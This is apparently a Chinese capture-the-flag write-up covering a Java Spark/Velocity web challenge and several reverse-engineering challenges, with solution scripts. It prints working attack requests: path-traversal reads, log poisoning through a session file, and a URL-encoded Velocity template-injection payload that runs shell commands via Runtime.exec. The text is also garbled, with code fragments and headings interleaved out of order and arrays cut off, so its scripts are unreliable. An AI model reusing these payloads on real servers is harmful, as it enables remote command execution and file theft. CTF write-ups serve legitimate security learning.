GET /?title=./../../../../../../../home/ctf/web/src/main/java/Blog.java
写文件到日志里面，然后再渲染
import static spark.Spark.*;
import java.io.*;
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;
import spark.template.velocity.VelocityTemplateEngine;
import java.io.StringWriter;
public class Blog {
    private static void log(String fname, String content) {
        try {
            FileWriter writer = new FileWriter(fname, true);
            writer.write(content);
            writer.close();
        } catch (IOException e) {
        }
    }
    public static void main(String[] arg) {
        staticFiles.location("/public");
        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, "file");
        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, 
"/");
        velocityEngine.init();
        VelocityContext context = new VelocityContext();
        get("/", (request, response) -> {
            request.session(true);
            String title = request.queryParams("title");
            if (title != null) {
                log("/tmp/" + request.session().id(), "Client IP: " + 
request.ip() + " -> File: " + title + "\n");
                Template template = 
velocityEngine.getTemplate("/home/ctf/web/src/main/resources/templates/" + 
title);
                StringWriter sw = new StringWriter();
                template.merge(context, sw);
                return sw;
            }
            Template template = 
velocityEngine.getTemplate("/home/ctf/web/src/main/resources/templates/index");
            StringWriter sw = new StringWriter();
            template.merge(context, sw);
            return sw;
        });
    }
}
RE
Faker
MFC
ﬂag长度32，ﬂag{}
提取了中间的26bytes，传给释放出来的一个DLL进行判断
ﬂag看上去很奇怪
在check函数前还有一个check函数
GET /?
title=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%2
3set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forN
ame(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat+/flag_1s_s0
00e4syyy223%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+i
n+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
GET /?title=./../../../../../../../tmp/node01trfvinauej5f1mbilf4d9s3r16533
Cookie: JSESSIONID=node01trfvinauej5f1mbilf4d9s3r16533.node0;
C:\Windows\SysWOW64\rundll32.exe FakerDll.dll,Check flag
将中间26byte分为每13byte一组,进行异或,最后进行base64编码,与硬编码比较
由于异或前的字符存在多解,所以只能枚举
import os
x=[['u','p'],'X',['0','5'],['b','g'],['I','L'],['P','U'],['h','m'],['B','G'],
['k','n'],['3','6'],['q','t'],['1','4'],'xsmYa',['W','X'],'r','P',['G','H'],'o',
['B','M'],['v','y'],'3',['D','K']]
l=len(x)
def dfs(dep,strs):
    if dep==l:
        os.system('C:\\Windows\\SysWOW64\\rundll32.exe FakersssDll.dll,Check 
'+strs)
        print(strs)
        return
    if type(x[dep])==type([1,2,3]):
        dfs(dep+1,strs+x[dep][0])
        dfs(dep+1,strs+x[dep][1])
跑了大概十几分钟
Goodbye
程序中的信息显示了这是个UPX 3.96加壳的binary，但是用UPX -d命令脱壳不太行，手工脱壳
手工脱了之后，发现这是个Golang的binary，使用helper脚本恢复函数名
然后发现在main_main之前就进行了一些逻辑，进main_init看，发现有一个获取自身文件名并读取的
操作，猜测是个自校验
程序没有反调，挂上调试器断在读文件之前，将要读的文件名改了并相应的提供原始未脱壳的binary即
可过掉这个check
读取之后AES解密得到了一个JSON
继续往下调，在main_main里面做了个MD5校验，但是Flag的生成和这个md5没有关系，直接把Check
过了就能拿到Flag
reg
aardio，提取出程序求解即可。
    else:
        dfs(dep+1,strs+x[dep])
dfs(0,'')
uX0bLPhBn3q1xsmYaWrPHoMv3K
{"flag":"MWIxY2M1MDcxN2VhOWVhNTIzNmEwYWJlMzVlMzE5ZDFlYzkyMDhkZTAzYjg1OTE3OGIzNWU
zM2FkOTVjMjYxMmY4MzIxNjc2NTA1NTM5ZGFlZGI5YjVkMjE1MWVmZGJmMGY5NWU5ZDM0NDllZjIwOWE
4OTNhMWFkMzFhNzZmNWVhYTI1ODRkYjdiOWFjN2E4YjNlYjE3NDZkMGZjMDVkMmVlZDljZjA5YjMzMTI
3OTIxYWVlMTYwOTMyYzI4ZTllMWMxMTU3NjJmMDBiN2VkNWQxMTYzNzA1YTZiZjg0ZWJkMWU1YzZhZjk
4MTMwNjc2OTkwZGNhMTA4OTI1NTUwNw==","secret":"Ydnn4CbiESEDShf80sxxHA=="}
keylist = {
  18908379,
  33159482,
  16588432,
  17582695,
  33159482,
  33159482,
  33490903,
  15925590,
  32828061,
  16257011,
  16919853,
  18245537,
  18576958,
  17914116,
  16588432,
  16257011,
  16919853,
  16588432,
  33490903,
  32828061,
  15925590,
  32828061,
  16919853,
  16588432,
  17251274,
  32828061,
  33822324,
  32496640,
  33822324,
  15925590,
  17251274,
  17914116,
  33490903,
  16919853,
  33159482,
  33822324,
  32496640,
  16588432,
  17251274,
  32165219,
  17582695,
  17582695,
  17582695,
  16919853,
  33490903,
  33159482,
  32165219,
  32828061,
  16257011,
  16919853,
  33822324,
  33822324,
  17914116,
  17582695,
  32165219,
  32828061,
  18245537,
  32496640,
  17582695,
  33822324,
  16919853,
  16257011,
  18245537,
  15925590
}
function deckey(owner)
  local i, j
  local ss = ""
  for i = 1, 64 do
    j = (keylist[i] - 17382) / 331421
    ss = ss .. string:pack(j)
  end
  return ss
end
console:setTitle("reg")
local flag = console:getText("Input your flag:")
console:log("check your reg code:" .. flag)
ﬂag:
local secretstr = deckey(console)
local aesiv = crypt.bin:decodeHex(string:left(secretstr, 32))
local aeskey = crypt.bin:decodeHex(string:right(secretstr, 32))
local aes = crypt:aes()
aes:setPassword(aeskey)
aes:setInitVector(aesiv)
local cipher = aes:encrypt(flag)
local output = crypt.bin:encodeBase64(cipher)
string:save("output", output)
console:log("cipher:", output)
console:pause()
import base64
from Crypto.Cipher import AES
import fuckpy3
keylist = [
    18908379,
    33159482,
    16588432,
    17582695,
    33159482,
    33159482,
    33490903,
    15925590,
    32828061,
    16257011,
    16919853,
    18245537,
    18576958,
    17914116,
    16588432,
    16257011,
    16919853,
    16588432,
    33490903,
    32828061,
    15925590,
    32828061,
    16919853,
    16588432,
    17251274,
    32828061,
    33822324,
    32496640,
    33822324,
    15925590,
    17251274,
    17914116,
    33490903,
    16919853,
    33159482,
    33822324,
    32496640,
    16588432,
    17251274,
APK
LinkChecker
程序通过libcheck和lua脚本互相调用来进行check。
lib check内容：
    32165219,
    17582695,
    17582695,
    17582695,
    16919853,
    33490903,
    33159482,
    32165219,
    32828061,
    16257011,
    16919853,
    33822324,
    33822324,
    17914116,
    17582695,
    32165219,
    32828061,
    18245537,
    32496640,
    17582695,
    33822324,
    16919853,
    16257011,
    18245537,